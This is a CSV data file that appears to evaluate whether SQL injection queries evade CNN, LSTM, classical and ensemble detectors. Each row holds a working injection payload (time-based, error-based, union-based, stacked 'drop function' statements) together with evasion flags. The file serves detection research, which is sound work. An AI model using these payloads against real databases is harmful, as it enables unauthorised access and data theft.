,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
116,1));begin user_lock.sleep(5); end and ((6874=6874,1));begin user_lock.sleep(5); end and ((6874=6874,0,1,0,0,0,0,0
117,"-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--","-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",1,1,0,0,0,0,0
118,"1%"") or elt(5873=5873,sleep(5))#","1%"") or elt(5873=5873,sleep(5))#",1,1,0,0,0,0,0
119,"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('zknl'='zknl","1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('zknl'='zknl",1,1,0,0,0,0,0
120,"1""))) and 7533=7533 and (((""alvd"" like ""alvd","1""))) and 7533=7533 and (((""alvd"" like ""alvd",1,1,0,0,0,0,0
121,"1 where 5929=5929 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","1 where 5929=5929 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,1,0,0,0,0,0
122,1'));(select * from (select(sleep(5)))acdk)#,1'));(select * from (select(sleep(5)))acdk)#,1,1,0,0,1,0,0
123,"1') as ildf where 5545=5545 union all select null,null,null,null#","1') as ildf where 5545=5545 union all select null,null,null,null#",1,1,0,0,0,0,0
124,' or '1' = '1,' or '1' = '1,1,1,0,0,0,0,0
125,"1"" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","1"" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1,1,0,0,0,0,0
126,1%');if(7899=7899) select 7899 else drop function zbbp--,1%');if(7899=7899) select 7899 else drop function zbbp--,1,1,0,0,0,0,0
127,1' where 3188=3188 and 9198=9198--,1' where 3188=3188 and 9198=9198--,1,1,0,0,0,0,0
128,"-4954%"") or 5244=4832","-4954%"") or 5244=4832",1,1,0,0,0,0,0
129,1'))) and 3602=1990#,1'))) and 3602=1990#,1,1,0,0,0,0,0
130,"-7142')) union all select 5083,5083,5083,5083#","-7142')) union all select 5083,5083,5083,5083#",1,1,0,0,0,0,0
131,"-9256"")) union all select 2977,2977,2977,2977,2977,2977,2977--","-9256"")) union all select 2977,2977,2977,2977,2977,2977,2977--",1,1,0,0,0,0,0
132,"-9532)) union all select 6039,6039,6039,6039--","-9532)) union all select 6039,6039,6039,6039--",1,1,0,0,0,0,0
133,1'+(select 'wvqj' where 3709=3709;begin user_lock.sleep(5); end--,1'+(select 'wvqj' where 3709=3709;begin user_lock.sleep(5); end--,1,1,0,0,0,0,0
134,"1%"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","1%"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1,1,0,0,0,0,0
135,"1') where 3476=3476 and elt(1210=1210,sleep(5))--","1') where 3476=3476 and elt(1210=1210,sleep(5))--",1,1,0,0,0,0,0
136,"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('nuil' like 'nuil","1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('nuil' like 'nuil",1,1,0,0,0,0,0
137,-9100) or 8792=9550--,-9100) or 8792=9550--,0,1,0,0,0,0,0
138,"-3873%')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","-3873%')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,1,0,0,0,0,0
139,"1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270","1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270",1,1,0,0,0,0,0
140,"1' in boolean mode);select count(*) from generate_series(1,5000000)#","1' in boolean mode);select count(*) from generate_series(1,5000000)#",1,1,0,0,0,0,0
141,1'))) and (1685=2985)*2985 and ((('rzwb'='rzwb,1'))) and (1685=2985)*2985 and ((('rzwb'='rzwb,1,1,0,0,0,0,0
142,"-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon","-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon",1,1,0,0,0,0,0
143,"-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--","-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--",1,1,0,0,0,0,0
144,"1,(select (case when (3743=9640) then 1 else 3743*(select 3743 from master..sysdatabases) end))","1,(select (case when (3743=9640) then 1 else 3743*(select 3743 from master..sysdatabases) end))",1,1,0,0,0,0,0
145,"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""","1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""",1,1,0,0,0,0,0
146,"1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""","1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",1,1,0,0,0,0,0
147,1%' or (select * from (select(sleep(5)))sddo)#,1%' or (select * from (select(sleep(5)))sddo)#,1,1,0,0,1,0,0
148,1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'fdbm' like 'fdbm,1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'fdbm' like 'fdbm,1,1,0,0,0,0,0
149,1) where 1527=1527 or 4240=(select 4240 from pg_sleep(5))--,1) where 1527=1527 or 4240=(select 4240 from pg_sleep(5))--,1,1,0,0,0,0,0
150,"1') and 3824=benchmark(5000000,md5(0x76555642))","1') and 3824=benchmark(5000000,md5(0x76555642))",1,1,0,0,1,0,0
151,"1'+(select yfuu where 1717=1717 union all select null,null,null,null,null,null,null,null,null--","1'+(select yfuu where 1717=1717 union all select null,null,null,null,null,null,null,null,null--",1,1,0,0,0,0,0
152,"-3963"" or 1224=5119","-3963"" or 1224=5119",1,1,0,0,0,0,0
153,1)) as cwyb where 3633=3633;select (case when (3681=5026) then 3681 else 3681*(select 3681 from information_schema.character_sets) end)#,1)) as cwyb where 3633=3633;select (case when (3681=5026) then 3681 else 3681*(select 3681 from information_schema.character_sets) end)#,1,1,0,0,0,0,0
154,-1354)) or 8571=8571--,-1354)) or 8571=8571--,0,1,0,0,0,0,0
155,"1' where 3612=3612 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--","1' where 3612=3612 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1,1,0,0,0,0,0
156,"1"")) as zgig where 5748=5748 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","1"")) as zgig where 5748=5748 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1,1,0,0,0,0,0
157,"1' in boolean mode) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#","1' in boolean mode) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",1,1,0,0,0,0,0
158,"1'||(select 'yags' where 6268=6268 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'","1'||(select 'yags' where 6268=6268 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",1,1,0,0,0,0,0
159,"1%"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","1%"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,1,0,0,0,0,0
160,"1%'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('%'='","1%'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('%'='",1,1,0,0,0,0,0
161,"1) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))","1) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",1,1,0,0,0,0,0
162,"1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,1,0,0,0,0,0
163,"-7324) or make_set(8486=6544,6544)","-7324) or make_set(8486=6544,6544)",0,1,0,0,0,0,0
164,"1') as gxpb where 7107=7107 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--","1') as gxpb where 7107=7107 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",1,1,0,0,0,0,0
165,"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# kkmw","1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# kkmw",1,1,0,0,0,0,0
166,1 and 6969=(select 6969 from pg_sleep(5))-- yczq,1 and 6969=(select 6969 from pg_sleep(5))-- yczq,1,1,0,0,0,0,0
167,"1%""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""","1%""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",1,1,0,0,0,0,0
168,"1"")) as eagr where 3366=3366 and elt(4249=4249,7259)--","1"")) as eagr where 3366=3366 and elt(4249=4249,7259)--",1,1,0,0,0,0,0
169,"1"" where 6023=6023;if(1928=4811) select 1928 else drop function ucko--","1"" where 6023=6023;if(1928=4811) select 1928 else drop function ucko--",1,1,0,0,0,0,0
170,"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""fkip""=""fkip","1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""fkip""=""fkip",1,1,0,0,1,0,0
171,"1""))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","1""))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
172,"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('qtfl'='qtfl","1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('qtfl'='qtfl",1,1,0,0,1,0,0
173,"1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,1,0,0,0,0,0
174,"-9606 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# iuij","-9606 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# iuij",1,1,0,0,0,0,0
175,"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--","1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,1,0,0,0,0,0
176,"1 where 9279=9279 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","1 where 9279=9279 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",0,1,0,0,0,0,0
177,"1%' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and '%'='","1%' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and '%'='",1,1,0,0,0,0,0
178,"1%""));select (case when (1499=4923) then 1499 else 1/(select 0) end)--","1%""));select (case when (1499=4923) then 1499 else 1/(select 0) end)--",1,1,0,0,0,0,0
179,"1'))) union all select null,null,null--","1'))) union all select null,null,null--",1,1,0,0,0,0,0
180,"-4319"") where 7534=7534 or 8246=3217","-4319"") where 7534=7534 or 8246=3217",1,1,0,0,0,0,0
181,"1) where 9724=9724 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--","1) where 9724=9724 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",0,1,0,0,0,0,0
182,1'));begin user_lock.sleep(5); end--,1'));begin user_lock.sleep(5); end--,1,1,0,0,0,0,0
183,"1%' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and '%'='","1%' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and '%'='",1,1,0,0,0,0,0
184,"1%') union all select null,null,null,null,null,null--","1%') union all select null,null,null,null,null,null--",1,1,0,0,0,0,0
185,"-8929%') union all select 9486,9486,9486,9486#","-8929%') union all select 9486,9486,9486,9486#",1,1,0,0,0,0,0
186,"1') as asjj where 1721=1721 union all select null,null,null,null,null,null--","1') as asjj where 1721=1721 union all select null,null,null,null,null,null--",1,1,0,0,0,0,0
187,"-4135"") as leiz where 3582=3582 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--","-4135"") as leiz where 3582=3582 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",1,1,0,0,0,0,0
188,"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('xzcr'='xzcr","1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('xzcr'='xzcr",1,1,0,0,0,0,0
189,"-1139) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","-1139) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,1,0,0,0,0,0
190,"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('rfln'='rfln","1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('rfln'='rfln",1,1,0,0,0,0,0
191,"1') where 4750=4750 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--","1') where 4750=4750 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",1,1,0,0,0,0,0
192,1))) and 9198=9198--,1))) and 9198=9198--,0,1,0,0,0,0,0
193,-4339) where 7178=7178 or 4008=7232,-4339) where 7178=7178 or 4008=7232,0,1,0,0,0,0,0
194,"1')) as ytfi where 3323=3323 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","1')) as ytfi where 3323=3323 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
195,1')));select (case when (5768=9169) then 5768 else 1/(select 0) end)--,1')));select (case when (5768=9169) then 5768 else 1/(select 0) end)--,1,1,0,0,0,0,0
196,"1' where 3125=3125 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--","1' where 3125=3125 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1,1,0,0,0,0,0
197,"1""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""zoag"" like ""zoag","1""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""zoag"" like ""zoag",1,1,0,0,0,0,0
198,"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('kyos' like 'kyos","1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('kyos' like 'kyos",1,1,0,0,0,0,0
199,"1%"");select pg_sleep(5)--","1%"");select pg_sleep(5)--",1,1,0,0,0,0,0
200,"1)) as midl where 9046=9046 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--","1)) as midl where 9046=9046 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",0,1,0,0,0,0,0
201,"-9313%"") or 5971=4572#","-9313%"") or 5971=4572#",1,1,0,0,0,0,0
202,"-1083%""))) or elt(1032=1032,3623) and (((""%""=""","-1083%""))) or elt(1032=1032,3623) and (((""%""=""",1,1,0,0,0,0,0
203,"-6093') where 9676=9676 union all select 9676,9676,9676,9676,9676,9676--","-6093') where 9676=9676 union all select 9676,9676,9676,9676,9676,9676--",1,1,0,0,0,0,0
